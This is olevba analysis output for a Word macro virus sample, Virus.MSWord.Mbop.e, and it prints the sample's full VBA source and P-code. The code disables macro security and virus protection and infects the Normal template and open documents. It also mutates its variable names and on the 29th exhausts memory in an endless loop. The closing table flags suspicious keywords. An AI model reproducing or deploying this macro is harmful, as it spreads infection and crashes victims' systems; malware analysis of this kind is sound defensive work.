olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mbop.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mbop.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
hssfihhhssfi = 1
hssfil1hssfi = "M"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1&"
Options.VirusProtection = False
Options.SaveNormalPrompt = False
hssfifihssfi = 1
Options.ConfirmConversions = False
Set hssfiNthssfi = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
hssfi11hssfi = 1
Set hssfiAdhssfi = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
hssfisehssfi = 3
Set hssfiTdhssfi = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
hssfitrhssfi = 3
hssfil2hssfi = "b"
hssfifnhssfi = hssfifihssfi & hssfisehssfi & hssfitrhssfi
For hssfiiihssfi = 1 To hssfiTdhssfi.countoflines
If InStr(hssfiTdhssfi.lines(hssfiiihssfi, 1), "Private Sub Document_Open()") <> 0 Then
hssfiSlhssfi = hssfiiihssfi
Exit For
End If
Next
hssfil3hssfi = "o"
hssfiVchssfi = Trim(hssfiTdhssfi.lines(hssfiSlhssfi, hssfiSlhssfi + hssfifnhssfi))
hssfilvhssfi = 97
hssfi15hssfi = 15
If hssfiNthssfi.countoflines > 0 Then
hssfiNlhssfi = hssfiNthssfi.lines(1, hssfiNthssfi.countoflines)
If InStr(hssfiNlhssfi, "Nt") = 0 And InStr(hssfiNlhssfi, "Sl") = 0 And InStr(hssfiNlhssfi, "Nl") = 0 And InStr(hssfiNlhssfi, "Ad") = 0 And InStr(hssfiNlhssfi, "Vc") = 0 And InStr(hssfiNlhssfi, "Td") = 0 Then
If InStr(LCase(hssfiNlhssfi), "private sub document_open()") <> 0 Then
For hssfiihssfi = 1 To hssfiNthssfi.countoflines
If InStr(LCase(hssfiNthssfi.lines(hssfiihssfi, 1)), "private sub document_open()") <> 0 Then
hssfinshssfi = hssfiihssfi
Exit For
End If
Next
For hssfiihssfi = hssfinshssfi To hssfiNthssfi.countoflines
If InStr(LCase(hssfiNthssfi.lines(hssfiihssfi, 1)), "end sub") <> 0 Then
hssfinehssfi = hssfiihssfi
Exit For
End If
Next
hssfiNthssfi.deletelines hssfinshssfi, hssfinehssfi
End If
If InStr(LCase(hssfiNlhssfi), "option explicit") <> 0 Then
For hssfiihssfi = 1 To hssfiNthssfi.countoflines
If InStr(LCase(hssfiNthssfi.lines(hssfiihssfi, 1)), "option explicit") <> 0 Then
hssfinshssfi = hssfiihssfi
Exit For
End If
Next
hssfiNthssfi.deletelines hssfinshssfi, 1
End If
hssfiNthssfi.addfromstring hssfiVchssfi
hssfiNthssfi.Save
hssfiinhssfi = hssfihhhssfi
End If
Else
hssfiNthssfi.addfromstring hssfiVchssfi
hssfiNthssfi.Save
hssfiinhssfi = hssfihhhssfi
End If
hssfihvhssfi = 122
hssfiihssfi = 1
hssfidqhssfi = Documents.Count
If hssfiAdhssfi.countoflines > 0 Then
hssfiAlhssfi = hssfiAdhssfi.lines(1, hssfiAdhssfi.countoflines)
If InStr(hssfiAlhssfi, "Nt") = 0 And InStr(hssfiAlhssfi, "Sl") = 0 And InStr(hssfiAlhssfi, "Nl") = 0 And InStr(hssfiAlhssfi, "Ad") = 0 And InStr(hssfiAlhssfi, "Vc") = 0 And InStr(hssfiAlhssfi, "Td") = 0 Then
If InStr(LCase(hssfiAlhssfi), "private sub document_open()") <> 0 Then
For hssfiihssfi = 1 To hssfiAdhssfi.countoflines
If InStr(LCase(hssfiAdhssfi.lines(hssfiihssfi, 1)), "private sub document_open()") <> 0 Then
hssfinshssfi = hssfiihssfi
Exit For
End If
Next
For hssfiihssfi = hssfinshssfi To hssfiAdhssfi.countoflines
If InStr(LCase(hssfiAdhssfi.lines(hssfiihssfi, 1)), "end sub") <> 0 Then
hssfinehssfi = hssfiihssfi
Exit For
End If
Next
hssfiAdhssfi.deletelines hssfinshssfi, hssfinehssfi
End If
If InStr(LCase(hssfiAlhssfi), "option explicit") <> 0 Then
For hssfiihssfi = 1 To hssfiAdhssfi.countoflines
If InStr(LCase(hssfiAdhssfi.lines(hssfiihssfi, 1)), "option explicit") <> 0 Then
hssfinshssfi = hssfiihssfi
Exit For
End If
Next
hssfiAdhssfi.deletelines hssfinshssfi, 1
End If
hssfiAdhssfi.addfromstring hssfiVchssfi
hssfiiahssfi = hssfihhhssfi
End If
Else
hssfiAdhssfi.addfromstring hssfiVchssfi
hssfiiahssfi = hssfihhhssfi
End If
hssfil4hssfi = "p"
Randomize
hssfi15hssfi = Int((hssfi15hssfi - hssfi11hssfi + hssfi11hssfi) * Rnd + hssfi11hssfi)
For hssfiiihssfi = 1 To hssfi15hssfi
Randomize
hssfiTnhssfi = hssfiTnhssfi & Chr(Int((hssfihvhssfi - hssfilvhssfi + 1) * Rnd + hssfilvhssfi))
Next
hssfid2hssfi = 9
hssfiVchssfi = hssfiTdhssfi.lines(1, hssfiTdhssfi.countoflines)
hssfiTdhssfi.deletelines 1, hssfiTdhssfi.countoflines
Do While InStr(hssfiVchssfi, "hssfi") <> 0
hssfiVchssfi = Mid(hssfiVchssfi, 1, InStr(hssfiVchssfi, "hssfi") - 1) & hssfiTnhssfi & Mid(hssfiVchssfi, InStr(hssfiVchssfi, "hssfi") + Len("hssfi"))
Loop
hssfiTdhssfi.addfromstring hssfiVchssfi
hssfidyhssfi = Day(Now)
hssfid1hssfi = 2
hssfil5hssfi = "!"
If hssfidyhssfi = hssfid1hssfi & hssfid2hssfi Then
Dim hssfisthssfi()
hssficahssfi = 0
Do
ReDim Preserve hssfisthssfi(hssficahssfi)
hssfiqwhssfi = CLng(1024)
hssfiqahssfi = hssfiqwhssfi
hssfiqzhssfi = hssfiqwhssfi * hssfiqahssfi
hssfisthssfi(hssficahssfi) = String(hssfiqzhssfi, Right(hssfiTnhssfi, 1))
DoEvents
hssficahssfi = hssficahssfi + 1
Loop
End If
If hssfiiahssfi = hssfihhhssfi Or hssfiinhssfi = hssfihhhssfi Then
MsgBox hssfil1hssfi & hssfil2hssfi & hssfil3hssfi & hssfil4hssfi & hssfil5hssfi, vbCritical
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Mbop.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7155 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0001 
' 	St hssfihhhssfi 
' Line #3:
' 	LitStr 0x0001 "M"
' 	St hssfil1hssfi 
' Line #4:
' 	LitStr 0x0002 "1&"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	LitDI2 0x0001 
' 	St hssfifihssfi 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set hssfiNthssfi 
' Line #10:
' 	LitDI2 0x0001 
' 	St hssfi11hssfi 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set hssfiAdhssfi 
' Line #12:
' 	LitDI2 0x0003 
' 	St hssfisehssfi 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set hssfiTdhssfi 
' Line #14:
' 	LitDI2 0x0003 
' 	St hssfitrhssfi 
' Line #15:
' 	LitStr 0x0001 "b"
' 	St hssfil2hssfi 
' Line #16:
' 	Ld hssfifihssfi 
' 	Ld hssfisehssfi 
' 	Concat 
' 	Ld hssfitrhssfi 
' 	Concat 
' 	St hssfifnhssfi 
' Line #17:
' 	StartForVariable 
' 	Ld hssfiiihssfi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld hssfiTdhssfi 
' 	MemLd countoflines 
' 	For 
' Line #18:
' 	Ld hssfiiihssfi 
' 	LitDI2 0x0001 
' 	Ld hssfiTdhssfi 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #19:
' 	Ld hssfiiihssfi 
' 	St hssfiSlhssfi 
' Line #20:
' 	ExitFor 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	StartForVariable 
' 	Next 
' Line #23:
' 	LitStr 0x0001 "o"
' 	St hssfil3hssfi 
' Line #24:
' 	Ld hssfiSlhssfi 
' 	Ld hssfiSlhssfi 
' 	Ld hssfifnhssfi 
' 	Add 
' 	Ld hssfiTdhssfi 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St hssfiVchssfi 
' Line #25:
' 	LitDI2 0x0061 
' 	St hssfilvhssfi 
' Line #26:
' 	LitDI2 0x000F 
' 	St hssfi15hssfi 
' Line #27:
' 	Ld hssfiNthssfi 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld hssfiNthssfi 
' 	MemLd countoflines 
' 	Ld hssfiNthssfi 
' 	ArgsMemLd lines 0x0002 
' 	St hssfiNlhssfi 
' Line #29:
' 	Ld hssfiNlhssfi 
' 	LitStr 0x0002 "Nt"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld hssfiNlhssfi 
' 	LitStr 0x0002 "Sl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld hssfiNlhssfi 
' 	LitStr 0x0002 "Nl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld hssfiNlhssfi 
' 	LitStr 0x0002 "Ad"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld hssfiNlhssfi 
' 	LitStr 0x0002 "Vc"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld hssfiNlhssfi 
' 	LitStr 0x0002 "Td"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #30:
' 	Ld hssfiNlhssfi 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #31:
' 	StartForVariable 
' 	Ld hssfiihssfi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld hssfiNthssfi 
' 	MemLd countoflines 
' 	For 
' Line #32:
' 	Ld hssfiihssfi 
' 	LitDI2 0x0001 
' 	Ld hssfiNthssfi 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #33:
' 	Ld hssfiihssfi 
' 	St hssfinshssfi 
' Line #34:
' 	ExitFor 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Next 
' Line #37:
' 	StartForVariable 
' 	Ld hssfiihssfi 
' 	EndForVariable 
' 	Ld hssfinshssfi 
' 	Ld hssfiNthssfi 
' 	MemLd countoflines 
' 	For 
' Line #38:
' 	Ld hssfiihssfi 
' 	LitDI2 0x0001 
' 	Ld hssfiNthssfi 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0007 "end sub"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #39:
' 	Ld hssfiihssfi 
' 	St hssfinehssfi 
' Line #40:
' 	ExitFor 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Next 
' Line #43:
' 	Ld hssfinshssfi 
' 	Ld hssfinehssfi 
' 	Ld hssfiNthssfi 
' 	ArgsMemCall deletelines 0x0002 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld hssfiNlhssfi 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld hssfiihssfi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld hssfiNthssfi 
' 	MemLd countoflines 
' 	For 
' Line #47:
' 	Ld hssfiihssfi 
' 	LitDI2 0x0001 
' 	Ld hssfiNthssfi 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #48:
' 	Ld hssfiihssfi 
' 	St hssfinshssfi 
' Line #49:
' 	ExitFor 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	Ld hssfinshssfi 
' 	LitDI2 0x0001 
' 	Ld hssfiNthssfi 
' 	ArgsMemCall deletelines 0x0002 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Ld hssfiVchssfi 
' 	Ld hssfiNthssfi 
' 	ArgsMemCall addfromstring 0x0001 
' Line #55:
' 	Ld hssfiNthssfi 
' 	ArgsMemCall Save 0x0000 
' Line #56:
' 	Ld hssfihhhssfi 
' 	St hssfiinhssfi 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	ElseBlock 
' Line #59:
' 	Ld hssfiVchssfi 
' 	Ld hssfiNthssfi 
' 	ArgsMemCall addfromstring 0x0001 
' Line #60:
' 	Ld hssfiNthssfi 
' 	ArgsMemCall Save 0x0000 
' Line #61:
' 	Ld hssfihhhssfi 
' 	St hssfiinhssfi 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	LitDI2 0x007A 
' 	St hssfihvhssfi 
' Line #64:
' 	LitDI2 0x0001 
' 	St hssfiihssfi 
' Line #65:
' 	Ld Documents 
' 	MemLd Count 
' 	St hssfidqhssfi 
' Line #66:
' 	Ld hssfiAdhssfi 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #67:
' 	LitDI2 0x0001 
' 	Ld hssfiAdhssfi 
' 	MemLd countoflines 
' 	Ld hssfiAdhssfi 
' 	ArgsMemLd lines 0x0002 
' 	St hssfiAlhssfi 
' Line #68:
' 	Ld hssfiAlhssfi 
' 	LitStr 0x0002 "Nt"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld hssfiAlhssfi 
' 	LitStr 0x0002 "Sl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld hssfiAlhssfi 
' 	LitStr 0x0002 "Nl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld hssfiAlhssfi 
' 	LitStr 0x0002 "Ad"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld hssfiAlhssfi 
' 	LitStr 0x0002 "Vc"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld hssfiAlhssfi 
' 	LitStr 0x0002 "Td"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #69:
' 	Ld hssfiAlhssfi 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #70:
' 	StartForVariable 
' 	Ld hssfiihssfi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld hssfiAdhssfi 
' 	MemLd countoflines 
' 	For 
' Line #71:
' 	Ld hssfiihssfi 
' 	LitDI2 0x0001 
' 	Ld hssfiAdhssfi 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #72:
' 	Ld hssfiihssfi 
' 	St hssfinshssfi 
' Line #73:
' 	ExitFor 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	StartForVariable 
' 	Next 
' Line #76:
' 	StartForVariable 
' 	Ld hssfiihssfi 
' 	EndForVariable 
' 	Ld hssfinshssfi 
' 	Ld hssfiAdhssfi 
' 	MemLd countoflines 
' 	For 
' Line #77:
' 	Ld hssfiihssfi 
' 	LitDI2 0x0001 
' 	Ld hssfiAdhssfi 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0007 "end sub"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #78:
' 	Ld hssfiihssfi 
' 	St hssfinehssfi 
' Line #79:
' 	ExitFor 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	StartForVariable 
' 	Next 
' Line #82:
' 	Ld hssfinshssfi 
' 	Ld hssfinehssfi 
' 	Ld hssfiAdhssfi 
' 	ArgsMemCall deletelines 0x0002 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	Ld hssfiAlhssfi 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #85:
' 	StartForVariable 
' 	Ld hssfiihssfi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld hssfiAdhssfi 
' 	MemLd countoflines 
' 	For 
' Line #86:
' 	Ld hssfiihssfi 
' 	LitDI2 0x0001 
' 	Ld hssfiAdhssfi 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #87:
' 	Ld hssfiihssfi 
' 	St hssfinshssfi 
' Line #88:
' 	ExitFor 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	StartForVariable 
' 	Next 
' Line #91:
' 	Ld hssfinshssfi 
' 	LitDI2 0x0001 
' 	Ld hssfiAdhssfi 
' 	ArgsMemCall deletelines 0x0002 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	Ld hssfiVchssfi 
' 	Ld hssfiAdhssfi 
' 	ArgsMemCall addfromstring 0x0001 
' Line #94:
' 	Ld hssfihhhssfi 
' 	St hssfiiahssfi 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	ElseBlock 
' Line #97:
' 	Ld hssfiVchssfi 
' 	Ld hssfiAdhssfi 
' 	ArgsMemCall addfromstring 0x0001 
' Line #98:
' 	Ld hssfihhhssfi 
' 	St hssfiiahssfi 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	LitStr 0x0001 "p"
' 	St hssfil4hssfi 
' Line #101:
' 	ArgsCall Read 0x0000 
' Line #102:
' 	Ld hssfi15hssfi 
' 	Ld hssfi11hssfi 
' 	Sub 
' 	Ld hssfi11hssfi 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld hssfi11hssfi 
' 	Add 
' 	FnInt 
' 	St hssfi15hssfi 
' Line #103:
' 	StartForVariable 
' 	Ld hssfiiihssfi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld hssfi15hssfi 
' 	For 
' Line #104:
' 	ArgsCall Read 0x0000 
' Line #105:
' 	Ld hssfiTnhssfi 
' 	Ld hssfihvhssfi 
' 	Ld hssfilvhssfi 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld hssfilvhssfi 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St hssfiTnhssfi 
' Line #106:
' 	StartForVariable 
' 	Next 
' Line #107:
' 	LitDI2 0x0009 
' 	St hssfid2hssfi 
' Line #108:
' 	LitDI2 0x0001 
' 	Ld hssfiTdhssfi 
' 	MemLd countoflines 
' 	Ld hssfiTdhssfi 
' 	ArgsMemLd lines 0x0002 
' 	St hssfiVchssfi 
' Line #109:
' 	LitDI2 0x0001 
' 	Ld hssfiTdhssfi 
' 	MemLd countoflines 
' 	Ld hssfiTdhssfi 
' 	ArgsMemCall deletelines 0x0002 
' Line #110:
' 	Ld hssfiVchssfi 
' 	LitStr 0x0005 "hssfi"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #111:
' 	Ld hssfiVchssfi 
' 	LitDI2 0x0001 
' 	Ld hssfiVchssfi 
' 	LitStr 0x0005 "hssfi"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld hssfiTnhssfi 
' 	Concat 
' 	Ld hssfiVchssfi 
' 	Ld hssfiVchssfi 
' 	LitStr 0x0005 "hssfi"
' 	FnInStr 
' 	LitStr 0x0005 "hssfi"
' 	FnLen 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St hssfiVchssfi 
' Line #112:
' 	Loop 
' Line #113:
' 	Ld hssfiVchssfi 
' 	Ld hssfiTdhssfi 
' 	ArgsMemCall addfromstring 0x0001 
' Line #114:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	St hssfidyhssfi 
' Line #115:
' 	LitDI2 0x0002 
' 	St hssfid1hssfi 
' Line #116:
' 	LitStr 0x0001 "!"
' 	St hssfil5hssfi 
' Line #117:
' 	Ld hssfidyhssfi 
' 	Ld hssfid1hssfi 
' 	Ld hssfid2hssfi 
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #118:
' 	Dim 
' 	VarDefn hssfisthssfi
' Line #119:
' 	LitDI2 0x0000 
' 	St hssficahssfi 
' Line #120:
' 	Do 
' Line #121:
' 	OptionBase 
' 	Ld hssficahssfi 
' 	Redim (Preserve) hssfisthssfi 0x0001 (As Variant)
' Line #122:
' 	LitDI2 0x0400 
' 	Coerce (Lng) 
' 	St hssfiqwhssfi 
' Line #123:
' 	Ld hssfiqwhssfi 
' 	St hssfiqahssfi 
' Line #124:
' 	Ld hssfiqwhssfi 
' 	Ld hssfiqahssfi 
' 	Mul 
' 	St hssfiqzhssfi 
' Line #125:
' 	Ld hssfiqzhssfi 
' 	Ld hssfiTnhssfi 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	ArgsLd String$ 0x0002 
' 	Ld hssficahssfi 
' 	ArgsSt hssfisthssfi 0x0001 
' Line #126:
' 	ArgsCall DoEvents 0x0000 
' Line #127:
' 	Ld hssficahssfi 
' 	LitDI2 0x0001 
' 	Add 
' 	St hssficahssfi 
' Line #128:
' 	Loop 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	Ld hssfiiahssfi 
' 	Ld hssfihhhssfi 
' 	Eq 
' 	Ld hssfiinhssfi 
' 	Ld hssfihhhssfi 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #131:
' 	Ld hssfil1hssfi 
' 	Ld hssfil2hssfi 
' 	Concat 
' 	Ld hssfil3hssfi 
' 	Concat 
' 	Ld hssfil4hssfi 
' 	Concat 
' 	Ld hssfil5hssfi 
' 	Concat 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

